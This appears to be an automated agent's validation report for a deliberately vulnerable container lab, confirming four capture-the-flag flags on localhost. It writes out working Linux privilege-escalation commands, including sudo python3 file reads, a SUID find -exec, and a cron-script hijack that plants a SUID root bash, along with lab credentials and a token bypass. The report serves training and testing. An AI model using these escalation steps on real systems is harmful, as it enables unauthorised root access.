# ForgeRange v1 Validation Report

**Date validated:** 2026-04-24  
**Validator:** Claude Code (automated run against live lab)  
**Reset command used:** `make reset` was already clean; containers started fresh ~1 minute before validation began.

---

## Lab State at Validation

All four containers healthy before testing began:

```
forge-web      127.0.0.1:8080->8080/tcp   Up
forge-internal 9090/tcp                   Up
forge-db       (internal)                 Up
forge-privesc  127.0.0.1:2222->22/tcp     Up
```

---

## Flags Confirmed

| # | Flag | Method | Result |
|---|------|--------|--------|
| 1 | `FLAG{enum_the_web}` | `GET http://127.0.0.1:8080/flag` | PASS |
| 2 | `FLAG{lateral_move_success}` | `docker exec forge-web curl http://forge-internal:9090/secret -H "X-Internal-Token: lab-bypass"` | PASS |
| 3 | `FLAG{db_creds_found}` | `docker exec forge-db psql -U app -d appdb -c "SELECT value FROM flags;"` | PASS |
| 4 | `FLAG{root_privesc_complete}` | SSH + privesc (all three methods — see below) | PASS |

---

## FLAG 4 Detail — SSH + Privilege Escalation

### SSH Login

```bash
ssh labuser@127.0.0.1 -p 2222   # password: labpassword
```

- Login succeeds with credentials `labuser:labpassword`.
- `/root/flag.txt` is **not** readable as `labuser` (returns `Permission denied`, exit 1).
- `sudo -l` output confirms the intended misconfiguration:

```
User labuser may run the following commands on <hostname>:
    (root) NOPASSWD: /usr/bin/python3
```

### Method 1 — sudo python3 (confirmed)

```bash
sudo python3 -c 'import os; print(open("/root/flag.txt").read())'
# → FLAG{root_privesc_complete}
```

### Method 2 — SUID find_lab binary (confirmed)

```
/usr/local/bin/find_lab  permissions: -rwsr-xr-x root root
```

```bash
/usr/local/bin/find_lab /root -exec cat /root/flag.txt \; -quit
# → FLAG{root_privesc_complete}
```

### Method 3 — World-writable cron hijack (confirmed)

```
/opt/cleanup.sh   permissions: -rwxrwxrwx root root
/etc/cron.d/cleanup: * * * * * root /opt/cleanup.sh
```

Payload written as `labuser`:

```bash
echo '#!/bin/bash' > /opt/cleanup.sh
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /opt/cleanup.sh
```

Cron fired after ~10 seconds. SUID bash appeared at `/tmp/rootbash`:

```bash
/tmp/rootbash -p -c "cat /root/flag.txt"
# → FLAG{root_privesc_complete}
```

`/opt/cleanup.sh` was restored to its original content and `/tmp/rootbash` removed after the test.

---

## Walkthrough Accuracy

The scenario walkthrough in `scenarios/01-full-attack-chain/README.md` matches reality with one caveat:

**Caveat — Method 2 command syntax:** The walkthrough uses `-exec /bin/bash -p \; -quit` (spawns an interactive root shell). This is correct in an interactive SSH session but cannot be driven non-interactively for automated testing. Validated with `-exec cat /root/flag.txt \; -quit` instead, which confirms the SUID escalation path without requiring a pty. The walkthrough command is correct for a student running it manually.

All other commands in the walkthrough execute as documented.

---

## No Changes Made

No services were added, no attack paths were modified, and no vulnerabilities were hardened. The only mutation during testing was a temporary overwrite of `/opt/cleanup.sh` (Method 3 test), which was immediately restored.
